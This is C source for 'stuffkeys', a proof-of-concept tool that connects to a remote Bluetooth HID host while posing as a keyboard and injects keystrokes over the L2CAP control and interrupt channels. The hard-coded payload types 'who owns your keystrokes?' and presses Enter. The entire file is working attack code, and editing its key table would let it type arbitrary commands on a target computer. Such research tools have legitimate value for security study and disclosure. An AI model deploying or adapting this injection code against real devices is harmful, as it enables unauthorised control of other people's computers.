/*
 *  stuffkeys - stuff keystrokes into a Bluetooth HID connection
 *
 *  version 1.0
 *
 *  Copyright (C) 2009-2010  Michael Ossmann <mike@ossmann.com>
 *  Copyright (C) 2003-2009  Marcel Holtmann <marcel@holtmann.org>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */

#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <sys/poll.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hidp.h>

#define L2CAP_PSM_HIDP_CTRL 0x11
#define L2CAP_PSM_HIDP_INTR 0x13
#define BUFLEN 65536
#define NUMFDS 2

static bdaddr_t bdaddr_a; // remote HID host
static bdaddr_t bdaddr_b; // local interface that connects (as device) to host

static const char* FD_NAMES[] = {
	"control out",
	"interrupt out",
	"control in",
	"interrupt in"
};

static const char KEYS[] = {
	0x1a, 0x0b, 0x12, 0x2c, //"who "
	0x12, 0x1a, 0x11, 0x16, 0x2c, //"owns "
	0x1c, 0x12, 0x18, 0x15, 0x2c, //"your "
	0x0e, 0x08, 0x1c, 0x16, 0x17, 0x15, 0x12, 0x0e, 0x08, 0x16, 0x38, 0x28 //"keystrokes?\n"
};
static char REPORT[] = {0xa1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const char ACK[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

/* copied from BlueZ's hidd.c */
static int l2cap_connect(bdaddr_t *src, bdaddr_t *dst, unsigned short psm)
{
	struct sockaddr_l2 addr;
	struct l2cap_options opts;
	int sk;

	if ((sk = socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
		return -1;

	memset(&addr, 0, sizeof(addr));
	addr.l2_family  = AF_BLUETOOTH;
	bacpy(&addr.l2_bdaddr, src);

	if (bind(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		close(sk);
		return -1;
	}

	memset(&opts, 0, sizeof(opts));
	opts.imtu = HIDP_DEFAULT_MTU;
	opts.omtu = HIDP_DEFAULT_MTU;
	opts.flush_to = 0xffff;

	setsockopt(sk, SOL_L2CAP, L2CAP_OPTIONS, &opts, sizeof(opts));

	memset(&addr, 0, sizeof(addr));
	addr.l2_family  = AF_BLUETOOTH;
	bacpy(&addr.l2_bdaddr, dst);
	addr.l2_psm = htobs(psm);

	if (connect(sk, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		close(sk);
		return -1;
	}

	return sk;
}//*/

static void stuff()
{
	struct sockaddr_l2 addr;
	socklen_t optlen;
	unsigned char *buf;
	char local[18];
	char remote[18];
	int i, j, k;
	int acs = -1; // control channel socket to a (host)
	int ais = -1; // interrupt channel socket to a (host)
	struct pollfd pf[NUMFDS];

	buf = malloc(BUFLEN);
	if (!buf) {
		perror("can't allocate buffer");
		exit(1);
	}

	printf("connecting HID control channel to host\n");
	while (acs < 0) {
		acs = l2cap_connect(&bdaddr_b, &bdaddr_a, L2CAP_PSM_HIDP_CTRL);
		if (acs < 0) {
			perror("connect failed");
			sleep(1);
		}
	}

	printf("connecting HID interrupt channel to host\n");
	while (ais < 0) {
		ais = l2cap_connect(&bdaddr_b, &bdaddr_a, L2CAP_PSM_HIDP_INTR);
		if (ais < 0) {
			perror("connect failed");
			sleep(1);
		}
	}

	ba2str(&bdaddr_a, remote);
	ba2str(&bdaddr_b, local);
	printf("connected to host %s from %s\n", remote, local);

	pf[0].fd = acs;
	pf[0].events = POLLIN;
	pf[1].fd = ais;
	pf[1].events = POLLIN;

	ssize_t len;
	int numrdy;

	numrdy = poll(pf, NUMFDS, 1);
	if (numrdy < 0) {
		perror("poll failed");
		goto error;
	}

	for (i = 0; i < NUMFDS; i++) {
	    printf("polling ...\n");
		if (pf[i].revents & POLLIN) {
		printf("received events\n");

			/* receive data */
			len = recv(pf[i].fd, buf, BUFLEN, 0);
			if (len < 0) {
				perror("recv failed");
				goto error;
			} else if (len == 0) {
				printf("disconnected\n");
				goto error;
			}

			/* print to screen */
			printf("%-13s:", FD_NAMES[i]);
			for (j = 0; j < len; j++)
				printf(" %02x", buf[j]);
			printf("\n");

			/* ack it */
			if (send(pf[0].fd, ACK, 10, 0) <= 0) {
				perror("send failed");
				goto error;
			}
		}
	}

	printf("sending keystrokes\n", remote, local);
	for (k = 0; k < 26; k++) {
		usleep(100000);
		REPORT[4] = KEYS[k];

		/* hold down shift key for question mark */
		if (KEYS[k] == 0x38)
			REPORT[2] = 0x02;

		if (send(pf[1].fd, REPORT, 10, 0) <= 0) {
			perror("send failed");
			goto error;
		}

		REPORT[4] = 0;
		if (send(pf[1].fd, REPORT, 10, 0) <= 0) {
			perror("send failed");
			goto error;
		}
	}

error:
	if (ais >= 0) close(ais);
	if (acs >= 0) close(acs);
	free(buf);
	exit(1);
}

static void usage(void)
{
	printf("stuffkeys - stuff keystrokes into a Bluetooth HID connection\n");
	printf("Usage:\n");
	printf("\tstuffkeys -a bdaddr_a -b bdaddr_b\n");
	printf("\n\tbdaddr_a is the address of the remote host\n");
	printf("\tbdaddr_b is the local interface that connects (as a device) to host\n");
	printf("\n\tbdaddr_b may be specified by interface (hciX) or bdaddr\n");
}

int main(int argc, char *argv[])
{
	int opt;
	int count = 0;

	while ((opt=getopt(argc,argv,"a:b:")) != EOF) {
		switch(opt) {
		case 'a':
			count++;
			str2ba(optarg, &bdaddr_a);
			break;
		case 'b':
			count++;
			if (!strncasecmp(optarg, "hci", 3))
				hci_devba(atoi(optarg + 3), &bdaddr_b);
			else
				str2ba(optarg, &bdaddr_b);
			break;
		default:
			usage();
			exit(1);
		}
	}

	if (count < 2) {
		usage();
		exit(1);
	}

	stuff();

	return 0;
}
